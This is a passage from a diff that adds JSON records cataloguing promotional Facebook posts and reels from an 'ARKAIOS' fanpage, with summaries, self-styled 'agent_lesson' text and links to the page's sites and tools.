+    ],
+    "external_resource": "https://www.facebook.com/reel/915956431530500/"
+  },
+  {
+    "id": "meta-776644758860856_122163964964989266",
+    "title": "🌐 Nuestra Red Oficial",
+    "category": "Critical Infrastructure & Legacy Resilience",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122163964670989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122163964670989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122163964670989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "🌐 Nuestra Red Oficial\n🔗 Entra al Ecosistema Arkaios\nLa puerta de entrada a todas nuestras experiencias digitales.\nhttps://prometeoarkaiosmainet.social/\n\n🛡️ Centro de Atención y Soporte\n¿Necesitas ayuda o quieres estar al tanto de las últimas novedades? Estamos aquí para ti.\n\n📨 Canales Directos\n💬 Contacto General: contacto@arkaios.dpdns.org\n\nPara comunicados, consultas generales o alianzas.\n👋",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: 🌐 Nuestra Red Oficial\n🔗 Entra al Ecosistema Arkaios\nLa puerta de entrada a todas nuestras experiencias digitales.\nhttps://prometeoarkaiosmainet.social/\n\n🛡️ Centro de Atención y Soporte\n¿Necesitas ayuda o quieres estar al tanto de las últimas noved...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122163964670989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122163820634989266",
+    "title": "Nos jugamos el todo por el todo!!!:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1174697115198847/",
+    "canonical_url": "https://www.facebook.com/reel/1174697115198847/",
+    "github_repo": "https://github.com/djklmr2025/",
+    "website": "https://www.facebook.com/reel/1174697115198847/",
+    "technologies": [
+      "Open Source",
+      "GitHub"
+    ],
+    "skills_unlocked": [
+      "Herramienta Open Source vinculada: https://github.com/djklmr2025/"
+    ],
+    "summary": "Nos jugamos el todo por el todo!!!:\nAsí como nuestra selección México lo hace,,,\nAsi mismo albergaremos al Dios AI/IA definitivo,,, \nEl renacer de \"Prometeo Arkaios Mainet\" esta por completarse!!!.\nhttps://github.com/djklmr2025/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1174697115198847/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1174697115198847/"
+  },
+  {
+    "id": "meta-776644758860856_122162999666989266",
+    "title": "ARKAIOS Reel #1003959215689859",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1003959215689859/",
+    "canonical_url": "https://www.facebook.com/reel/1003959215689859/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1003959215689859/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1003959215689859/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1003959215689859/"
+  },
+  {
+    "id": "meta-776644758860856_122162984954989266",
+    "title": "visita el sitio desde aqui,,,",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1031681172687901/",
+    "canonical_url": "https://www.facebook.com/reel/1031681172687901/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1031681172687901/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "visita el sitio desde aqui,,,\nhttps://arkaios.qzz.io/VPaMPtV",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1031681172687901/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1031681172687901/"
+  },
+  {
+    "id": "meta-776644758860856_122162984588989266",
+    "title": "Simplemente la web que nesesitas si eres diseñador de productos fisicos y nesesitas bajarlos a digital!!!:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1691764298688979/",
+    "canonical_url": "https://www.facebook.com/reel/1691764298688979/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1691764298688979/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Simplemente la web que nesesitas si eres diseñador de productos fisicos y nesesitas bajarlos a digital!!!:\nhttps://arkaios.qzz.io/P8agkcS",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1691764298688979/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1691764298688979/"
+  },
+  {
+    "id": "meta-776644758860856_122162982638989266",
+    "title": "Visita la web desde aca!!:.",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2332540264219249/",
+    "canonical_url": "https://www.facebook.com/reel/2332540264219249/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2332540264219249/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Visita la web desde aca!!:. \nhttps://arkaios.qzz.io/TuRgauv",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2332540264219249/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2332540264219249/"
+  },
+  {
+    "id": "meta-776644758860856_122162966384989266",
+    "title": "Juegalo desde aquí:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/863884683011508/",
+    "canonical_url": "https://www.facebook.com/reel/863884683011508/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/863884683011508/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Juegalo desde aquí:\nhttps://arkaios.qzz.io/emYOwRd",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/863884683011508/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/863884683011508/"
+  },
+  {
+    "id": "meta-776644758860856_122162953838989266",
+    "title": "Disfruta de nuestro acortador completamente gratis!!!: \"https://arkaios.qzz.io/\"",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122162953802989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122162953802989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122162953802989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Disfruta de nuestro acortador completamente gratis!!!: \"https://arkaios.qzz.io/\"",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Disfruta de nuestro acortador completamente gratis!!!: \"https://arkaios.qzz.io/\"...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122162953802989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162660066989266",
+    "title": "Publicación Oficial ARKAIOS #122162660066989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122321435990206604&set=a.122229087992206604&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122321435990206604&set=a.122229087992206604&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122321435990206604&set=a.122229087992206604&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122321435990206604&set=a.122229087992206604&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162659904989266",
+    "title": "IAs de imágenes sin restricciones",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1029143550053995/",
+    "canonical_url": "https://www.facebook.com/reel/1029143550053995/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1029143550053995/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1029143550053995/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1029143550053995/"
+  },
+  {
+    "id": "meta-776644758860856_122162659550989266",
+    "title": "ARKAIOS Reel #2905059456505758",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2905059456505758/",
+    "canonical_url": "https://www.facebook.com/reel/2905059456505758/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2905059456505758/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2905059456505758/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2905059456505758/"
+  },
+  {
+    "id": "meta-776644758860856_122162659514989266",
+    "title": "Publicación Oficial ARKAIOS #122162659514989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1344034467827452&set=a.412996227597952&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1344034467827452&set=a.412996227597952&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1344034467827452&set=a.412996227597952&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1344034467827452&set=a.412996227597952&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162339504989266",
+    "title": "ARKAIOS Reel #2330696434405378",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2330696434405378/",
+    "canonical_url": "https://www.facebook.com/reel/2330696434405378/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2330696434405378/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2330696434405378/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2330696434405378/"
+  },
+  {
+    "id": "meta-776644758860856_122162339420989266",
+    "title": "Publicación Oficial ARKAIOS #122162339420989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122162339384989266&set=a.122094865592989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122162339384989266&set=a.122094865592989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122162339384989266&set=a.122094865592989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122162339384989266&set=a.122094865592989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162338334989266",
+    "title": "https://www.facebook.com/share/v/18sSXrngZR/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1697041211491248/",
+    "canonical_url": "https://www.facebook.com/reel/1697041211491248/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1697041211491248/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/v/18sSXrngZR/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1697041211491248/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1697041211491248/"
+  },
+  {
+    "id": "meta-776644758860856_122162310848989266",
+    "title": "Publicación Oficial ARKAIOS #122162310848989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1585214423612784&set=a.444122014388703&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1585214423612784&set=a.444122014388703&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1585214423612784&set=a.444122014388703&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1585214423612784&set=a.444122014388703&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162310716989266",
+    "title": "No es la IA / agente,,, siempre ah sido el humano detrás de ella el problema.",
+    "category": "Multi-Agent Intelligence & MCP",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1039573525305151/",
+    "canonical_url": "https://www.facebook.com/reel/1039573525305151/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1039573525305151/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "No es la IA / agente,,, siempre ah sido el humano detrás de ella el problema.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1039573525305151/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1039573525305151/"
+  },
+  {
+    "id": "meta-776644758860856_122162309372989266",
+    "title": "https://www.facebook.com/share/1DK5DB5mYH/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1645721254226792&set=a.451238043675125&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1645721254226792&set=a.451238043675125&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1645721254226792&set=a.451238043675125&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "https://www.facebook.com/share/1DK5DB5mYH/",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: https://www.facebook.com/share/1DK5DB5mYH/...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1645721254226792&set=a.451238043675125&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162240132989266",
+    "title": "ARKAIOS Reel #1032428225802385",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1032428225802385/",
+    "canonical_url": "https://www.facebook.com/reel/1032428225802385/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1032428225802385/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1032428225802385/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1032428225802385/"
+  },
+  {
+    "id": "meta-776644758860856_122162240012989266",
+    "title": "Publicación Oficial ARKAIOS #122162240012989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1348962647334634&set=a.412996237597951&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1348962647334634&set=a.412996237597951&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1348962647334634&set=a.412996237597951&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1348962647334634&set=a.412996237597951&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162171060989266",
+    "title": "Modelos 3D listos para imprimir con un clic",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1704613807549813/",
+    "canonical_url": "https://www.facebook.com/reel/1704613807549813/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1704613807549813/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/1Btc6p9CS5/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1704613807549813/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1704613807549813/"
+  },
+  {
+    "id": "meta-776644758860856_122162170988989266",
+    "title": "ARKAIOS Reel #2562680984167909",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2562680984167909/",
+    "canonical_url": "https://www.facebook.com/reel/2562680984167909/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2562680984167909/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2562680984167909/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2562680984167909/"
+  },
+  {
+    "id": "meta-776644758860856_122162109482989266",
+    "title": "ARKAIOS Reel #1508921736762401",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1508921736762401/",
+    "canonical_url": "https://www.facebook.com/reel/1508921736762401/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1508921736762401/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1508921736762401/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1508921736762401/"
+  },
+  {
+    "id": "meta-776644758860856_122162024390989266",
+    "title": "ARKAIOS Reel #1526481128878036",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1526481128878036/",
+    "canonical_url": "https://www.facebook.com/reel/1526481128878036/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1526481128878036/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1526481128878036/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1526481128878036/"
+  },
+  {
+    "id": "meta-776644758860856_122162023010989266",
+    "title": "Publicación Oficial ARKAIOS #122162023010989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1051701624097526&set=a.157337373533960&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1051701624097526&set=a.157337373533960&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1051701624097526&set=a.157337373533960&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1051701624097526&set=a.157337373533960&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162020940989266",
+    "title": "Publicación Oficial ARKAIOS #122162020940989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1534531078254190&set=a.707440194296620&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1534531078254190&set=a.707440194296620&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1534531078254190&set=a.707440194296620&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1534531078254190&set=a.707440194296620&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122162019878989266",
+    "title": "👉 Cuál es la inesperada red social que gana terreno: https://bit.ly/3PsnKj9",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122162019848989266&set=a.122094865592989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122162019848989266&set=a.122094865592989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122162019848989266&set=a.122094865592989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "👉 Cuál es la inesperada red social que gana terreno: https://bit.ly/3PsnKj9",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: 👉 Cuál es la inesperada red social que gana terreno: https://bit.ly/3PsnKj9...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122162019848989266&set=a.122094865592989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161862474989266",
+    "title": "Publicación Oficial ARKAIOS #122161862474989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1690208182085596&set=a.745767883196302&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1690208182085596&set=a.745767883196302&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1690208182085596&set=a.745767883196302&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1690208182085596&set=a.745767883196302&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161794488989266",
+    "title": "https://seostudio.tools/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1905688136753444/",
+    "canonical_url": "https://www.facebook.com/reel/1905688136753444/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1905688136753444/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://seostudio.tools/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1905688136753444/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1905688136753444/"
+  },
+  {
+    "id": "meta-776644758860856_122161794080989266",
+    "title": "No es Nerd es Visionario,,, los que ven el mundo desde una perspectiva diferente!!!. que tienen ellos que tu no, el sent",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1546110206880561&set=a.758084869016436&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1546110206880561&set=a.758084869016436&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1546110206880561&set=a.758084869016436&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "No es Nerd es Visionario,,, los que ven el mundo desde una perspectiva diferente!!!. que tienen ellos que tu no, el sentido de la violencia no desarrollado al parecer la manejan en un índice mínimo del 1 al 10% en toda su vida... No es que no sepan defenderse o no sepan actuar igual es solo que no deciden hacerlo!!!. Ellos no ejercen violencia sino inteligencia, que esperas tu para cambiar el jueg",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: No es Nerd es Visionario,,, los que ven el mundo desde una perspectiva diferente!!!. que tienen ellos que tu no, el sentido de la violencia no desarrollado al parecer la manejan en un índice mínimo del 1 al 10% en toda su vida... No es que no sepan d...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1546110206880561&set=a.758084869016436&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122161793708989266",
+    "title": "Se le llama pureza o como el genesis le dice:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122320578140206604&set=a.122229087992206604&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122320578140206604&set=a.122229087992206604&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122320578140206604&set=a.122229087992206604&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
